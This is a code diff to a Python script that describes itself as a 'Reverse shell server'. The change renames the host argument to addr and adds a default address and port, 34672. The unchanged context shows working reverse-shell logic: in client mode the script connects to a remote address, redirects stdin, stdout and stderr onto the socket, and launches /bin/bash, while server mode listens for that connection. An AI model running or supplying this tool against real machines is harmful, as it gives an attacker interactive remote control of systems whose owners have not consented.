@@ -11,11 +11,11 @@ import pty
 import time
 
 
-def connect(host, port, shell):
+def connect(addr, port, shell):
   while True:
     try:
       with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-        s.connect((host, port))
+        s.connect((addr, port))
         os.dup2(s.fileno(), 0)
         os.dup2(s.fileno(), 1)
         os.dup2(s.fileno(), 2)
@@ -67,9 +67,9 @@ def handle(conn, addr):
   except BrokenPipeError: pass
 
 
-def listen(host, port):
+def listen(addr, port):
   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-  s.bind((host, port))
+  s.bind((addr, port))
   s.listen(1)
 
   while True:
@@ -78,12 +78,12 @@ def listen(host, port):
 
 
 parser = argparse.ArgumentParser(description = 'Reverse shell server')
-parser.add_argument('host', help = 'Server host name or IP')
-parser.add_argument('port', type = int, help = 'Server port')
+parser.add_argument('-a', '--addr', default = '0.0.0.0', help = 'Server host name or IP')
+parser.add_argument('-p', '--port', default = 34672, type = int, help = 'Server port')
 parser.add_argument('-c', '--client', action = 'store_true', help = 'Client mode')
 parser.add_argument('-s', '--shell', default = '/bin/bash', help = 'Client shell')
 args = parser.parse_args()
 
 
-if args.client: connect(args.host, args.port, args.shell)
-else: listen(args.host, args.port)
+if args.client: connect(args.addr, args.port, args.shell)
+else: listen(args.addr, args.port)
